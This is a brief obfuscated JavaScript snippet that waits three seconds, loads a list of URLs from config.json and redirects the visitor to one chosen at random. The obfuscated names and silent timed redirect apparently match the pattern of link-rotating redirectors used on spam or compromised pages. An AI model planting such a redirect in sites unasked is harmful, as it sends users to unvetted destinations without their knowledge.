setTimeout(function () {
  fetch("config.json").then(_0x2cef21 => {
    if (!_0x2cef21.ok) throw new Error("Failed to fetch config.json: " + _0x2cef21.status + " " + _0x2cef21.statusText);
    return _0x2cef21.json();
  }).then(_0x365b5d => {
    const _0x22861c = _0x365b5d.urls || [],
      _0x3b82d2 = Math.floor(Math.random() * _0x22861c.length),
      _0x29a63a = _0x22861c[_0x3b82d2];
    window.location.href = _0x29a63a;
  }).catch(_0x5ae119 => console.error("Error fetching config.json:", _0x5ae119.message));
}, 3000);
